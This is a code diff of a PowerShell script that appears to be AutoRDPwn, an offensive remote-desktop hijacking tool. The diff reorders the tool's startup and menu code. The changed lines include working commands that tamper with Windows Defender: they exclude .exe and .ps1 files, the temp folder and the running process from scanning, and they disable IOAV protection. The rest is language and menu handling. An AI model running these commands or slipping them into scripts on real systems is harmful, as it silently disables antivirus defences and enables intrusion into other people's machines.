@@ -72,7 +72,7 @@ function Remove-Exclusions {
     Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:localhostClientTrustedHosts -Force 2>&1> $null } 
 
     do { Show-Banner ; Show-Language
-    $help = 'The detailed guide of use can be found at the following link:'
+    $system = (Get-WmiObject Win32_OperatingSystem).OSArchitecture ; $help = "The detailed guide of use can be found at the following link:"
     $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()
     switch ($input) {
@@ -80,8 +80,7 @@ function Remove-Exclusions {
        '2' { $Language = 'Spanish' }
        'H' { Write-Host ; Write-Host $help -ForegroundColor Green ; Write-Host ; Write-Host 'https://darkbyte.net/autordpwn-la-guia-definitiva' -ForegroundColor Blue ; sleep -milliseconds 7500 }
        'X' { continue }
-    default { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','X') if($input -in '1','2'){
-    $system = (Get-WmiObject Win32_OperatingSystem -computername $env:computername).OSArchitecture
+    default { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','X') if($input -in '1','2'){    
 
 if($Language -in 'English') {
   $txt1  = "Load additional modules"
@@ -231,13 +230,12 @@ if($Language -in 'Spanish') {
 
     $Powershell = $host.version ; Write-Host ; if($Powershell -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red'
     Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit }
-    else { $system = (Get-WmiObject Win32_OperatingSystem -computername $env:computername).OSArchitecture ; Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null
-    Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null
-    Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; $currentuser = [Environment]::username }
+    else { Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null; Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null
+    Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null }
 
     do { Show-Banner ; Show-Menu  
     $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) {
+    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) { $currentuser = [Environment]::username
 
         '1' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
